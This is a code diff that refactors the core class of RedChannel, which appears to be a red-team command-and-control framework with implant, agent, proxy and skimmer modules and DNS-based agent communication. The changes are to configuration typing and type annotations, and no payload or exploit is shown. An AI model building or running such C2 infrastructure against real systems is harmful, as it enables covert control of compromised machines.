@@ -1,17 +1,16 @@
 import * as crypto from "crypto";
 import * as path from "path";
 import ECKey from "ec-key";
-import merge from "lodash.merge";
 
 import { Config, Constants, emsg, padTail, padZero } from "../utils/utils";
 import Crypto, { CipherModel, KeyExportType } from "./crypto";
 import Logger from "./logger";
-import SkimmerModule from "../modules/skimmer";
-import StaticDnsModule from "../modules/static_dns";
-import ImplantModule from "../modules/implant";
-import AgentModule from "../modules/agent";
-import ProxyModule from "../modules/proxy";
-import C2Module from "../modules/c2";
+import SkimmerModule, { SkimmerModuleConfig as SkimmerModuleConfig } from "../modules/skimmer";
+import StaticDnsModule, { StaticDnsModuleConfig } from "../modules/static_dns";
+import ImplantModule, { ImplantModuleConfig as ImplantModuleConfig } from "../modules/implant";
+import AgentModule, { AgentModuleConfig } from "../modules/agent";
+import ProxyModule, { ProxyModuleConfig as ProxyModuleConfig } from "../modules/proxy";
+import C2Module, { C2ModuleConfig } from "../modules/c2";
 
 import { implant } from "../pb/implant";
 
@@ -92,6 +91,17 @@ export interface Modules {
     proxy: ProxyModule;
     implant: ImplantModule;
 }
+// the config values for each module are made optional
+// as we don't need to define all of these for the config
+// to _merge in BaseModule
+export interface ModulesConfig {
+    c2: Partial<C2ModuleConfig>;
+    agent: Partial<AgentModuleConfig>;
+    skimmer: Partial<SkimmerModuleConfig>;
+    static_dns: Partial<StaticDnsModuleConfig>;
+    proxy: Partial<ProxyModuleConfig>;
+    implant: Partial<ImplantModuleConfig>;
+}
 
 export default class RedChannel {
     version = Constants.VERSION;
@@ -99,19 +109,7 @@ export default class RedChannel {
     agents: Map<AgentId, AgentModel>;
     flood: Map<AgentIdRandId, NodeJS.Timeout>;
 
-    /**
-     * available commands for 'help' to display
-     *
-     * agent commands are available while interacting with an agent
-     * c2 commands are available in the main menu
-     */
-    commands: any;
-
-    /**
-     * module actions
-     *
-     * function will be executed when the command is typed
-     */
+    // module instances
     modules: Modules;
 
     hashedPassword: string;
@@ -126,7 +124,7 @@ export default class RedChannel {
 
     crypto: Crypto;
 
-    constructor(debug: boolean, domain: string, password: string, cliConfig: any, configFile?: string) {
+    constructor(c2Password: string, cliConfig: ModulesConfig, configFile: string) {
         this.log = new Logger();
 
         this.agents = new Map<AgentId, AgentModel>();
@@ -134,11 +132,10 @@ export default class RedChannel {
         this.configFile = configFile ?? Config.DEFAULT_CONFIG_FILE;
 
         this.modules = {
-            c2: new C2Module(domain, debug, this.configFile),
+            c2: new C2Module(this, cliConfig.c2),
             proxy: new ProxyModule(
-                this.configFile,
                 this,
-                this.c2MessageHandler.bind(this),
+                cliConfig.proxy,
                 (result) => {
                     this.log.debug(result.message);
                 },
@@ -146,20 +143,18 @@ export default class RedChannel {
                     this.log.error(error.message);
                 }
             ),
-            implant: new ImplantModule(this.configFile, this),
-            static_dns: new StaticDnsModule(this.configFile),
-            skimmer: new SkimmerModule(this.configFile),
-            agent: new AgentModule(this.configFile),
+            implant: new ImplantModule(this, cliConfig.implant),
+            static_dns: new StaticDnsModule(this, cliConfig.static_dns),
+            skimmer: new SkimmerModule(this, cliConfig.skimmer),
+            agent: new AgentModule(this, cliConfig.agent),
         };
-
-        this.modules.c2.config = merge(this.modules.c2.config, cliConfig);
 
         if (!this.modules.c2.config.domain) {
             throw new Error(`Please specify the c2 domain via cli or config file, see '--help'`);
         }
 
-        this.plaintextPassword = password;
-        this.hashedPassword = crypto.createHash("md5").update(password).digest("hex");
+        this.plaintextPassword = c2Password;
+        this.hashedPassword = crypto.createHash("md5").update(c2Password).digest("hex");
 
         this.appRoot = __dirname;
 
@@ -168,7 +163,7 @@ export default class RedChannel {
         this.flood = new Map<AgentId, NodeJS.Timeout>();
     }
 
-    initAgent(agentId, channel: AgentChannel, ip?: string) {
+    initAgent(agentId: string, channel: AgentChannel, ip?: string) {
         if (!this.agents.has(agentId)) {
             this.agents.set(agentId, {
                 id: agentId,
@@ -183,7 +178,7 @@ export default class RedChannel {
         }
     }
 
-    killAgent(agentId) {
+    killAgent(agentId: string) {
         this.agents.delete(agentId);
     }
 
@@ -394,7 +389,7 @@ export default class RedChannel {
         this.log.debug(`records: ${JSON.stringify(ips, null, 2)}`);
     }
 
-    isCommandInSendQ(agentId, command) {
+    isCommandInSendQ(agentId: string, command: implant.AgentCommand) {
         const agent = this.agents.get(agentId);
         if (!agent) {
             this.log.error(`agent ${agentId} not found`);
@@ -436,7 +431,7 @@ export default class RedChannel {
         return this.agents.keys();
     }
 
-    getAgent(agentId): AgentModel | null {
+    getAgent(agentId: string): AgentModel | null {
         return this.agents.get(agentId) || null;
     }
 
@@ -445,12 +440,13 @@ export default class RedChannel {
         const hostname = question.name;
         const channel = question.type === "PROXY" ? AgentChannel.PROXY : AgentChannel.DNS;
 
-        if (this.modules.static_dns.config[hostname]) {
-            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${this.modules.static_dns.config[hostname]}'`);
+        const staticDnsHostnameIp = this.modules.static_dns.config.get(hostname);
+        if (staticDnsHostnameIp) {
+            this.log.info(`static_dns: responding to request for host: '${hostname}' with ip '${staticDnsHostnameIp}'`);
             res.answer.push({
                 name: hostname,
                 type: C2AnswerType.TYPE_A,
-                data: this.modules.static_dns.config[hostname],
+                data: staticDnsHostnameIp,
                 ttl: Config.C2_ANSWER_TTL_SECS,
             });
             return res.end();
@@ -594,7 +590,7 @@ export default class RedChannel {
 
     isAgentFlooding(floodId: string): boolean {
         if (this.flood.has(floodId)) {
-            clearTimeout(this.flood[floodId]);
+            clearTimeout(this.flood.get(floodId));
             this.flood.set(
                 floodId,
                 setTimeout(() => {
